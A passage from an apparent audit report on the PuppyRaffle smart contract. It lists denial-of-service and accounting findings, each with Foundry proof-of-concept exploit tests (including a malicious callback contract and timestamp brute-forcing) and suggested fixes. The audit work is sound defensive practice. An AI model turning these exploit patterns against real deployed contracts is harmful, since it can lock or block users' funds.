    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);
    address p4 = address(4);
    address attacker = address(12345);

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddress, duration);
        vm.deal(p1, entranceFee);
        vm.deal(p2, entranceFee);
        vm.deal(p3, entranceFee);
        vm.deal(p4, entranceFee);
        // 4 honest players enter
        _enterSingle(p1);
        _enterSingle(p2);
        _enterSingle(p3);
        _enterSingle(p4);
        assertEq(address(raffle).balance, 4 ether, "initial pot should be 4 ether");
    }

    function _enterSingle(address player) internal {
        address[] memory arr = new address[](1);
        arr[0] = player;
        vm.prank(player);
        raffle.enterRaffle{value: entranceFee}(arr);
    }

    function test_DoS_selectWinner_via_lengthInflation() public {
        uint256 startTime = raffle.raffleStartTime();

        // Attacker inflates players.length with holes (no net ETH left in contract from these entries)
        uint256 cycles = 10; // can be arbitrarily large
        for (uint256 i = 0; i < cycles; i++) {
            address ghost = address(uint160(1000 + i));
            vm.deal(ghost, entranceFee);
            // enter once
            _enterSingle(ghost);
            // find index and refund to create a hole
            uint256 idx = raffle.getActivePlayerIndex(ghost);
            vm.prank(ghost);
            raffle.refund(idx);
        }

        // After inflation: balance still 4 ether, but players.length = 4 + cycles
        assertEq(address(raffle).balance, 4 ether, "balance unchanged after refunds");

        // Let raffle duration elapse
        vm.warp(startTime + duration + 1);

        // selectWinner will attempt to pay prizePool based on (players.length * entranceFee) > balance, and revert
        vm.prank(attacker);
        vm.expectRevert();
        raffle.selectWinner();

        // State machine did not advance: previousWinner not recorded, start time unchanged
        assertEq(raffle.previousWinner(), address(0), "winner should not be recorded");
        assertEq(raffle.raffleStartTime(), startTime, "raffleStartTime should not advance on revert");
    }
}


## Suggested Mitigation
Base pot and minimum-player checks on active participants and actual available funds, not players.length. Compute the winner among non-zero entries and prize from activeCount or contract balance minus fees. Example fix:

- Replace length-based pot with active count and skip zero slots when selecting winner.

uint256 activeCount; for (uint256 i; i < players.length; i++) { if (players[i] != address(0)) activeCount++; }
require(activeCount >= 4, "Need at least 4 active players");
uint256 totalAmountCollected = activeCount * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
// pick winner among non-zero addresses
uint256 rand = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty)));
uint256 target = rand % activeCount;
address winner; uint256 seen;
for (uint256 i; i < players.length; i++) {
    if (players[i] != address(0)) {
        if (seen == target) { winner = players[i]; break; }
        seen++;
    }
}
require(winner != address(0), "invalid winner");

- Alternatively, compute prizePool from address(this).balance - totalFees right before payout and cap by available balance; and compact the players array on refund to prevent length inflation.


## [M-2]. O(n^2) duplicate scan in PuppyRaffle.enterRaffle enables gas-based DoS of new entries

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
UnboundedLoops

## Description
enterRaffle first appends all newPlayers to players, then runs a nested O(n^2) duplicate scan over the entire players array, which is unbounded and user-grown. An attacker can bloat players so that any subsequent enterRaffle exceeds the gas/block limit, preventing new users from joining until the round is settled. Vulnerable snippet:

for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}

## Impact
A permissionless gas-based DoS of new entries: by growing players to a moderate size, subsequent calls to enterRaffle require iterating O(n^2) pairs and will exceed typical per-tx gas limits, preventing further participation until the raffle can be settled. Recovery requires waiting for raffleDuration to elapse and calling selectWinner, which resets players; there is no admin shortcut.

## Proof of Concept
1) Attacker grows players to a moderate, but still feasible size in a single or a few calls (e.g., 200–300 unique addresses). This succeeds because the nested duplicate scan at ~250 entrants is expensive but still fits block gas limits on common networks. 2) Once players is large, any subsequent enterRaffle call must perform an O(n^2) scan over the entire array. A victim attempting to enter with a normal, moderate gas cap (e.g., 300k–1M) will run out of gas during the duplicate scan. 3) No new players can join until selectWinner executes after raffleDuration, which deletes the players array.

## Proof of Code
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract GasGriefDoSTest is Test {
    PuppyRaffle raffle;
    address attacker = address(0xA11CE);
    address victim = address(0xB0B);

    function setUp() public {
        // Set tiny fee so we can cheaply inflate players
        raffle = new PuppyRaffle(1, address(this), 1 days);
    }

    function test_GasGrief_BlocksNewEntriesWithModerateGas() public {
        // 1) Attacker seeds many unique players in one transaction at a size that should still pass
        uint256 N = 250; // keeps the attacker's tx within block gas, yet large enough to grief others
        address[] memory entrants = new address[](N);
        for (uint256 i = 0; i < N; i++) {
            entrants[i] = address(uint160(i + 1));
        }
        vm.deal(attacker, N);
        vm.prank(attacker);
        raffle.enterRaffle{value: N}(entrants);

        // Sanity: contract holds N wei (1 wei each)
        assertEq(address(raffle).balance, N, "seed balance mismatch");

        // 2) Victim tries to enter one address under a realistic/moderate gas cap
        address[] memory one = new address[](1);
        one[0] = victim;
        vm.deal(victim, 1);
        vm.prank(victim);
        (bool ok, ) = address(raffle).call{value: 1, gas: 300000}(
            abi.encodeWithSelector(raffle.enterRaffle.selector, one)
        );

        // Expect failure due to gas exhaustion on O(n^2) duplicate scan over large players[]
        assertTrue(!ok, "Victim entry should fail due to O(n^2) gas blowup");

        // 3) Ensure no funds were accepted from the failed attempt
        assertEq(address(raffle).balance, N, "balance changed on failed entry");
    }
}


## Suggested Mitigation
Avoid scanning the entire players array. Track active participation in O(1) using a round-based membership map and only check duplicates within the new batch (bounded by user-controlled input). Example:

// Add to storage
uint256 public currentRound = 1;
mapping(address => uint256) public lastEnteredRound;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "Must send enough");
    // Check duplicates only within the batch (bounded) and vs O(1) membership
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address p = newPlayers[i];
        // batch-level duplicate check
        for (uint256 j = i + 1; j < newPlayers.length; j++) {
            require(p != newPlayers[j], "Duplicate in batch");
        }
        // global uniqueness in current round
        require(lastEnteredRound[p] != currentRound, "Duplicate player");
        lastEnteredRound[p] = currentRound;
        players.push(p);
    }
    emit RaffleEnter(newPlayers);
}

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender && playerAddress != address(0), "Not active");
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    lastEnteredRound[msg.sender] = 0; // allow re-entry after refund in same round
    emit RaffleRefunded(playerAddress);
}

function selectWinner() external {
    // ... existing logic ...
    delete players;
    currentRound += 1; // logically resets membership without iterating
    // ... payout & mint ...
}



## [M-3]. Rounding dust in 80/20 split bricks withdrawFees via strict balance==totalFees check

## Exploit Type
RoundingError

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
PricePrecisionOrRoundingError

## Description
selectWinner computes prize and fee with two separate integer divisions, truncating both and dropping the combined remainder (dust). That dust remains in the contract balance but is not accounted in totalFees. withdrawFees then strictly requires address(this).balance == totalFees and permanently reverts once any dust exists.

Vulnerable snippet:

uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
...
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

Because both divisions truncate, when totalAmountCollected % 5 != 0, dust = 1 wei is left after prize payout. This persists across rounds and grows cumulatively, making the strict equality false forever and bricking all fee withdrawals.

## Impact
Permanent fee-withdrawal DoS occurs whenever totalAmountCollected % 5 != 0. In those configurations, selectWinner leaves 1 wei of dust (balance - totalFees) that persists and makes withdrawFees’ strict equality check fail forever, freezing all future fee withdrawals. Note: with the repository’s default deployment parameter entranceFee = 1 ether (divisible by 5), totalAmountCollected is always divisible by 5 and the bug does not trigger. Any deployment using an entranceFee not divisible by 5 will brick fee withdrawals after the first settlement where totalAmountCollected % 5 != 0.

## Proof of Concept
omit

## Proof of Code
omit

## Suggested Mitigation
Compute one leg of the split and derive the other to ensure prize + fee == totalAmountCollected with a single rounding site. For example: compute prizePool = (totalAmountCollected * 80) / 100; then fee = totalAmountCollected - prizePool (or vice versa). This eliminates dust and preserves the withdrawFees equality check. Optionally, as a defense-in-depth measure, also gate withdrawFees on business state (e.g., require(players.length == 0)) rather than balance equality alone to reduce brittleness.


## [M-4]. Duplicate-check includes refunded address(0) entries, permanently DoSing enterRaffle after two refunds

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.enterRaffle

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Description
The uniqueness invariant over players breaks after refunds. refund() zeroes a slot, leaving holes:

players[playerIndex] = address(0);

enterRaffle() validates uniqueness across the entire players array (after appending new entries), but does not ignore zeroed slots:

for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}

With two refunds, players contains at least two address(0) entries. Any subsequent enterRaffle() call reverts on the pre-existing address(0) duplicates, preventing all future entries. If players.length < 4, selectWinner() can never be called to reset the array, bricking the raffle indefinitely. This is an AccountingInvariantViolation: the intended uniqueness constraint is applied to sentinel values introduced by refunds, breaking the system’s ability to progress.

## Impact
Protocol-wide DoS of new entries. From a fresh round, an attacker can enter twice and refund both to create two address(0) slots; all subsequent deposits revert with 'Duplicate player'. If players.length < 4, settlement cannot proceed, leaving the raffle stuck until a redeploy/upgrade or manual state intervention. This blocks user participation and protocol revenue.

## Proof of Concept
1) Attacker controls two EOAs A and B.
2) Attacker enters both A and B in a single tx (paying 2× entranceFee).
3) A calls refund(0); B calls refund(1). players = [address(0), address(0)].
4) Any user attempts enterRaffle([...]) with correct payment; enterRaffle pushes, then the duplicate check sees players[0] == players[1] == address(0) and reverts with 'Duplicate player'.
5) Because players.length == 2 (<4), selectWinner() also cannot be called, so the state never recovers. The raffle is bricked permissionlessly with only gas cost.

## Proof of Code
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract DuplicateZeroDosTest is Test {
    PuppyRaffle raffle;
    address attackerA = address(0xA11CE);
    address attackerB = address(0xB0B);
    address victim = address(0xC0FFEE);
    address feeAddr = address(0xFEE);

    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    function setUp() public {
        vm.deal(attackerA, 10 ether);
        vm.deal(attackerB, 10 ether);
        vm.deal(victim, 10 ether);
        raffle = new PuppyRaffle(FEE, feeAddr, DURATION);
    }

    function test_DuplicateZeroesDoS_enterRaffle_and_brick() public {
        // 1) Attacker enters two addresses A and B
        address[] memory entrants = new address[](2);
        entrants[0] = attackerA;
        entrants[1] = attackerB;
        vm.prank(attackerA);
        raffle.enterRaffle{value: 2 ether}(entrants);

        // Sanity: A and B are in the array
        assertEq(raffle.players(0), attackerA);
        assertEq(raffle.players(1), attackerB);

        // 2) Refund both to create two zero slots
        vm.prank(attackerA);
        raffle.refund(0);
        vm.prank(attackerB);
        raffle.refund(1);

        // Now both entries are zeroed
        assertEq(raffle.players(0), address(0));
        assertEq(raffle.players(1), address(0));

        // 3) Any future entry is reverted due to existing duplicate address(0) entries
        address[] memory one = new address[](1);
        one[0] = victim;
        vm.prank(victim);
        vm.expectRevert(bytes("PuppyRaffle: Duplicate player"));
        raffle.enterRaffle{value: 1 ether}(one);

        // State remains bricked (still two zero slots)
        assertEq(raffle.players(0), address(0));
        assertEq(raffle.players(1), address(0));

        // 4) Even after duration, cannot settle because length < 4 and no one can enter anymore
        vm.warp(block.timestamp + DURATION + 1);
        vm.expectRevert(bytes("PuppyRaffle: Need at least 4 players"));
        raffle.selectWinner();
    }
}


## Suggested Mitigation
Exclude address(0) from the uniqueness check or avoid creating holes. Two safe options:

A) Skip zero addresses during duplicate validation:

for (uint256 i = 0; i < players.length - 1; i++) {
    if (players[i] == address(0)) continue;
    for (uint256 j = i + 1; j < players.length; j++) {
        if (players[j] == address(0)) continue;
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}

B) Remove holes on refund (swap-and-pop) so no duplicate zeros can exist:

function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    payable(msg.sender).sendValue(entranceFee);
    uint256 last = players.length - 1;
    players[playerIndex] = players[last];
    players.pop();
    emit RaffleRefunded(playerAddress);
}

Option B also bounds gas and removes O(n^2) risk from growing arrays. If stable indices are required externally, prefer a mapping-based membership set instead of an array.


## [M-5]. Malicious winner contract can revert receive/onERC721Received to brick selectWinner and halt raffle settlement

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
GriefableCallbacks

## Description
selectWinner performs two untrusted external callbacks in sequence: it first sends ETH to the chosen winner, then mints via _safeMint, which for contract winners triggers onERC721Received. Either callback can revert and bubble up, reverting the whole transaction and bricking settlement with no bypass. Vulnerable snippet:

(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
_safeMint(winner, tokenId);

A malicious winner contract can revert in its receive() to fail the ETH send, or accept ETH then revert in onERC721Received during _safeMint. Because there is no try/catch, the entire settlement reverts, leaving players unchanged and the raffle stuck. An attacker can enter multiple unique malicious contracts to make it highly likely one is selected, repeatedly griefing settlement.

## Impact
Temporary DoS of core settlement flow: prize payout and NFT mint are blocked for all users. Funds (pot + fees) remain locked in the contract until a successful settlement, and the raffle cannot progress. Requires admin/upgrade intervention or a code change to resolve if grief persists.

## Proof of Concept
1) Attacker deploys a MaliciousWinner contract that reverts in onERC721Received (or in receive()).
2) Attacker enters the raffle with three EOAs plus the MaliciousWinner address (duplicates disallowed, but unique addresses are fine).
3) After raffleDuration, attacker selects a timestamp such that winnerIndex == MaliciousWinner by brute forcing over future timestamps (since winnerIndex = keccak(attacker, ts, diff) % players.length).
4) Call selectWinner; _safeMint triggers onERC721Received on MaliciousWinner, which reverts. Entire transaction reverts: no prize sent, no NFT minted, players array not cleared, raffleStartTime not advanced.
5) Repeat to continuously brick settlement and halt the raffle.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract MaliciousWinner {
    // Accept ETH (do not revert here to demonstrate mint-hook DoS path)
    receive() external payable {}
    // Revert on ERC721 safe mint
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        revert("grief: reject NFT");
    }
}

contract GriefableCallbacksTest is Test {
    PuppyRaffle raffle;
    MaliciousWinner evil;

    address attacker = address(0xBEEF);
    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);
    address fee = address(99);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, fee, 1 days);
        evil = new MaliciousWinner();
    }

    function test_DoS_selectWinner_reverting_onERC721Received_bricks_settlement() public {
        // Arrange: enter 4 players, last is malicious contract
        address[] memory entrants = new address[](4);
        entrants[0] = p1;
        entrants[1] = p2;
        entrants[2] = p3;
        entrants[3] = address(evil);

        vm.deal(attacker, 10 ether);
        vm.prank(attacker);
        raffle.enterRaffle{value: 4 ether}(entrants);

        uint256 start = raffle.raffleStartTime();
        uint256 dur = raffle.raffleDuration();

        // Fix difficulty for determinism and brute-force a timestamp where idx == 3
        vm.difficulty(77);
        uint256 targetTs = start + dur + 1;
        for (uint256 i = 0; i < 8192; i++) {
            uint256 idx = uint256(keccak256(abi.encodePacked(attacker, targetTs + i, uint256(77)))) % 4;
            if (idx == 3) { targetTs = targetTs + i; break; }
        }
        vm.warp(targetTs);

        // Pre-state
        uint256 pot = address(raffle).balance; // == 4 ether
        assertEq(pot, 4 ether);
        assertEq(raffle.previousWinner(), address(0));
        assertEq(raffle.players(3), address(evil));

        // Act: selecting winner with malicious contract as recipient should revert
        vm.prank(attacker);
        vm.expectRevert();
        raffle.selectWinner();

        // Assert: no state change; pot not paid; no NFT minted; raffle still stuck
        assertEq(address(raffle).balance, pot);
        assertEq(raffle.previousWinner(), address(0));
        assertEq(raffle.balanceOf(address(evil)), 0);
        // players array not cleared due to revert
        assertEq(raffle.players(3), address(evil));
    }
}


## Suggested Mitigation
Break untrusted callbacks out of the critical path and make settlement non-blocking:
- Use pull payments for prize distribution (credit balance, later withdraw) and never require the external call to succeed:

// Example (Solidity 0.7.6 style)
mapping(address => uint256) public pendingPrizes;

function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "Raffle not over");
    require(players.length >= 4, "Need at least 4 players");
    // ...compute winner, prizePool, fee, rarity, tokenId...
    delete players;
    raffleStartTime = block.timestamp;
    previousWinner = winner;

    // Accrue prize; winner withdraws later to avoid revert-based DoS
    pendingPrizes[winner] += prizePool;
    totalFees = totalFees + uint64(fee);

    // Mint NFT without invoking untrusted onERC721Received hook
    // Prefer a try/catch wrapper; if safe mint fails, fallback to _mint
    if (!_trySafeMint(winner, tokenId)) {
        _mint(winner, tokenId);
    }
}

function withdrawPrize() external {
    uint256 amount = pendingPrizes[msg.sender];
    require(amount > 0, "No prize");
    pendingPrizes[msg.sender] = 0;
    (bool ok,) = msg.sender.call{value: amount}("");
    require(ok, "Prize withdraw failed");
}

function _trySafeMint(address to, uint256 tokenId) internal returns (bool) {
    try this.__safeMint(to, tokenId) { return true; } catch { return false; }
}

function __safeMint(address to, uint256 tokenId) external {
    require(msg.sender == address(this), "only self");
    _safeMint(to, tokenId);
}

This removes hard requires on untrusted callbacks, ensuring settlement cannot be griefed. Alternatively, mint to escrow (contract) on failure and let the winner claim later via safeTransferFrom.


## [M-6]. selectWinner overestimates pot using players.length causing settlement DoS with refunded holes

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
ReserveOrPriceDesync

## Description
selectWinner assumes the pot equals players.length * entranceFee, but refund() zeroes entries without shrinking length. This desynchronizes the assumed pot from the actual ETH balance. Vulnerable snippet: totalAmountCollected = players.length * entranceFee; ... players[playerIndex] = address(0); When H refunded slots exist among length L = A + H, actual balance is A*entranceFee but prizePool is 0.8*L*entranceFee. If 0.8*(A+H) > A (i.e., H > 0.25A), the prize transfer exceeds balance and the call reverts, permanently blocking settlement.

## Impact
Anyone can create enough refunded holes so that prizePool (computed from players.length) exceeds the contract’s real pot, making selectWinner revert and blocking settlement. This is a repeatable, permissionless DoS of the raffle’s core settlement flow. Funds are not permanently locked: remaining active entrants can still self-refund and an external top-up or additional entries can unstick settlement, but without intervention the raffle cannot complete and fees cannot be withdrawn.

## Proof of Concept
1) Attacker enters multiple unique addresses. 2) Attacker refunds enough of their tickets to create holes (H > 0.25*A). 3) After raffleDuration, any call to selectWinner computes prizePool from players.length, exceeding contract balance. 4) The prize transfer reverts, bricking settlement for all users.

## Proof of Code
pragma solidity >=0.8.13;

import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract ReserveOrPriceDesync_DoS_Test is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function _enter(address[] memory addrs) internal {
        vm.deal(address(this), entranceFee * addrs.length);
        raffle.enterRaffle{value: entranceFee * addrs.length}(addrs);
    }

    function test_DoS_settlement_reverts_when_holes_overestimate_pot() public {
        // Arrange: 4 unique players enter
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        _enter(players);

        // Two players refund -> A=2, H=2, length still 4, balance = 2 * entranceFee
        vm.prank(address(1));
        raffle.refund(0);
        vm.prank(address(2));
        raffle.refund(1);
        assertEq(address(raffle).balance, 2 * entranceFee);

        // Raffle over
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // Expect revert due to prizePool > actual balance
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }
}


## Suggested Mitigation
Do not infer the pot from players.length. Base payouts on the actual reserve net of accrued fees and avoid selecting zeroed entries:
- Compute pot safely (Solidity 0.7.6 requires SafeMath or explicit check):
  require(address(this).balance >= uint256(totalFees), "PuppyRaffle: invalid pot");
  uint256 pot = address(this).balance - uint256(totalFees);
  uint256 prizePool = pot * 80 / 100;
  uint256 fee = pot - prizePool;
  totalFees += uint64(fee);
- Sample a winner only from active (non-zero) entries, or resample/skip address(0). Optionally maintain an activeCount or a compacted list to avoid holes and ensure the minimum-players check uses activeCount.
- Optionally enforce winner != address(0) before minting and payout.


## [M-7]. selectWinner overcounts refunded slots causing prize>balance and bricking settlement

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.selectWinner

## Minimim Privilege Required
Permissionless

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Description
selectWinner assumes every players slot is funded. refund() leaves address(0) holes, but settlement computes pot as players.length * entranceFee and may pick a zero address. Vulnerable snippet: function selectWinner() external { require(players.length >= 4, ...); uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length; address winner = players[winnerIndex]; uint256 totalAmountCollected = players.length * entranceFee; uint256 prizePool = (totalAmountCollected * 80) / 100; ... (bool success,) = winner.call{value: prizePool}(""); require(success, ...); _safeMint(winner, tokenId); } If more than 20% of counted slots were refunded, address(this).balance < prizePool and the transfer fails (success=false), reverting the whole call. Since players.length still counts holes, anyone can push players.length>=4 and then refund 1+ entries (25% for length=4), permanently DoS-ing settlement.

## Impact
Anyone can cause selectWinner to revert indefinitely. After creating holes via refund(), totalAmountCollected is computed from players.length (including holes) while the contract balance only reflects non-refunded entries. If refunded slots exceed 20% of players.length, prizePool > address(this).balance and the prize transfer fails, reverting the whole settlement. Additionally, even with <=20% holes, if the random index selects a zeroed slot, _safeMint() will revert (ERC721: mint to the zero address), also bricking settlement. As a result, the raffle cannot complete, players cannot be cleared, and fee withdrawal remains blocked (balance != totalFees). This is a repeatable, permissionless DoS of the core settlement flow.

## Proof of Concept
1) Attacker funds 4 unique addresses into the raffle in one tx. 2) Attacker refunds 1 of those entries, creating a hole but keeping players.length==4. 3) After raffleDuration elapses, attacker (or anyone) calls selectWinner. Contract computes prizePool as 0.8 * 4 * fee = 3.2*fee while actual balance is only 3*fee, so the value transfer fails and selectWinner reverts. 4) The revert preserves state (players still holey, balance unchanged). Repeating the call continues to revert, bricking settlement and locking funds until admin intervention.

## Proof of Code
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract AccountingInvariantViolationTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    address feeAddr = address(99);

    address sponsor = address(100);
    address p1 = address(1);
    address p2 = address(2);
    address p3 = address(3);
    address p4 = address(4);
    address attacker = address(0xBEEF);

    function setUp() public {
        vm.deal(sponsor, 100 ether);
        vm.deal(p1, 1 ether);
        vm.deal(p2, 1 ether);
        vm.deal(p3, 1 ether);
        vm.deal(p4, 1 ether);
        raffle = new PuppyRaffle(FEE, feeAddr, 1 days);
    }

    function test_DOS_selectWinner_overcounts_refunds() public {
        // Arrange: enter 4 players
        address[] memory arr = new address[](4);
        arr[0] = p1; arr[1] = p2; arr[2] = p3; arr[3] = p4;
        vm.prank(sponsor);
        raffle.enterRaffle{value: FEE * 4}(arr);

        // One player refunds (25% refunded > 20% threshold)
        vm.prank(p1);
        raffle.refund(0); // players[0] = address(0), length still 4

        // Sanity: contract holds only 3 * FEE now and players array still length 4
        assertEq(address(raffle).balance, 3 ether, "balance should be 3 * fee after one refund");
        // Note: players is a public array in 0.7.6; length is not directly accessible in solidity 0.8 via getter, 
        // but the min-players check inside selectWinner will still use length==4 including the hole.

        // Time passes
        vm.warp(raffle.raffleStartTime() + raffle.raffleDuration() + 1);

        // Act/Assert: selectWinner reverts because prizePool (0.8*4*fee = 3.2 ether) > balance (3 ether)
        vm.prank(attacker);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();

        // Invariant: funds remain stuck and no winner recorded
        assertEq(address(raffle).balance, 3 ether, "funds remain stuck in contract");
        assertEq(raffle.totalFees(), 0, "fees should not accrue on revert");
        assertEq(raffle.previousWinner(), address(0), "no winner set on revert");

        // Repeating will continue to revert until state is manually repaired
        vm.prank(attacker);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }
}


## Suggested Mitigation
Fix by eliminating holes or by deriving payouts and selection from actual active entries: (A) Make players dense on refund using swap-and-pop so players.length always equals the count of funded tickets; ensure getActivePlayerIndex is updated accordingly. (B) If you keep holes, compute the pot from actual funds (pot = address(this).balance - uint256(totalFees)), derive prize/fee from pot, and select a winner only among nonzero addresses (e.g., maintain an activeCount or a compacted view for selection). Do not gate settlement on pot == players.length * entranceFee, as that reintroduces a DoS when holes exist. Additionally, guard against zero-address winners (require(winner != address(0))) or ensure selection excludes zero slots, and consider effects-first ordering: compute prize/fee, select a valid winner, transfer prize (checking success), then update state and mint.




